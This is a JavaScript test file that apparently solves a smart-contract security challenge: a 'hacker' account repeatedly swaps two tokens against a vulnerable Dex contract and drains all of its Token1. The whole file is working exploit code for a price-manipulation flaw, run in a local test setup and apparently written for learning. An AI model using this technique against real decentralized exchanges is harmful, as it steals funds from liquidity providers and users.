const { expect } = require("chai");

describe("Dex", function () {
  it("Should empty Dex balance of Token1", async function () {

    const [deployer, dex_deployer, hacker] = await ethers.getSigners();

    const Token1 = await ethers.getContractFactory("Token1", deployer);
    const Token2 = await ethers.getContractFactory("Token2", deployer);
    const Dex = await ethers.getContractFactory("Dex", dex_deployer);
    
    const token1 = await Token1.deploy("Token1", "tkn1", ethers.utils.parseUnits("1000"));
    const token2 = await Token2.deploy("Token2", "tkn2", ethers.utils.parseUnits("1000"));
    const dex = await Dex.deploy(token1.address, token2.address);

    // send tokens to the Dex 
    await token1.transfer(dex.address, ethers.utils.parseUnits("100"));
    await token2.transfer(dex.address, ethers.utils.parseUnits("100"));

    console.log(`Token1 Dex Balance: ${ethers.utils.formatEther(await token1.balanceOf(dex.address))}`)
    console.log(`Token2 Dex Balance: ${ethers.utils.formatEther(await token2.balanceOf(dex.address))}`)

    // send tokens to the hacker
    await token1.transfer(hacker.address, ethers.utils.parseUnits("10"));
    await token2.transfer(hacker.address, ethers.utils.parseUnits("10"));

    await token1.connect(hacker).approve(dex.address, ethers.utils.parseUnits("110"));
    await token2.connect(hacker).approve(dex.address, ethers.utils.parseUnits("110"));

    console.log(`\nToken1 hacker balance: ${ethers.utils.formatEther(await token1.balanceOf(hacker.address))}`)
    console.log(`Token2 hacker balance: ${ethers.utils.formatEther(await token2.balanceOf(hacker.address))}`)

    // take all the Token1 tokens in the Dex
    let round = 0;
    for(i = 0; i <= 5; i++) {
      console.log('\nRound: ', round);
      if(round % 2 == 0) {
        console.log('swaping token1 for token2')
        let token2_amount_swap = await dex.connect(hacker).get_swap_price(token1.address, token2.address, await token1.balanceOf(hacker.address));
  
        let token2_contract_balance = await token2.balanceOf(dex.address)
        let token1_contract_balance = await token1.balanceOf(dex.address);
        
        let amount_to_swap = await token1.balanceOf(hacker.address);
        if(BigInt(token2_amount_swap) > BigInt(token2_contract_balance)) {
          amount_to_swap = token1_contract_balance;
        }
        await dex.connect(hacker).swap(token1.address, token2.address, amount_to_swap);
        console.log(`hacker token2 balance is: ${ethers.utils.formatEther(await token2.balanceOf(hacker.address))}`);
      } else {
        console.log('swaping token2 for token1')
        let token1_amount_swap = await dex.connect(hacker).get_swap_price(token2.address, token1.address, await token2.balanceOf(hacker.address));
        
        let token2_contract_balance = await token2.balanceOf(dex.address)
        let token1_contract_balance = await token1.balanceOf(dex.address)
        
        let amount_to_swap_2 = await token2.balanceOf(hacker.address)
        if(BigInt(token1_amount_swap) > BigInt(token1_contract_balance)) {
          amount_to_swap_2 = token2_contract_balance;
          console.log('token2 amount to swap: ',ethers.utils.formatEther(amount_to_swap_2.toString()));
        }
        await dex.connect(hacker).swap(token2.address, token1.address, amount_to_swap_2);
        console.log(`hacker token1 balance is: ${ethers.utils.formatEther(await token1.balanceOf(hacker.address))}`);
      }
      round ++
    }

    hacker_balance_token1 = ethers.utils.formatEther(await token1.balanceOf(hacker.address))
    expect(hacker_balance_token1).to.equal('110.0');

    console.log('\nHacker no has all the Token1 tokens from Dex...')
    console.log(`\nToken1 hacker balance: ${ethers.utils.formatEther(await token1.balanceOf(hacker.address))}`);
    console.log(`Token2 hacker balance: ${ethers.utils.formatEther(await token2.balanceOf(hacker.address))}`);

    console.log(`\nToken1 Dex Balance: ${ethers.utils.formatEther(await token1.balanceOf(dex.address))}`)
    console.log(`Token2 Dex Balance: ${ethers.utils.formatEther(await token2.balanceOf(dex.address))}`)
  });
});
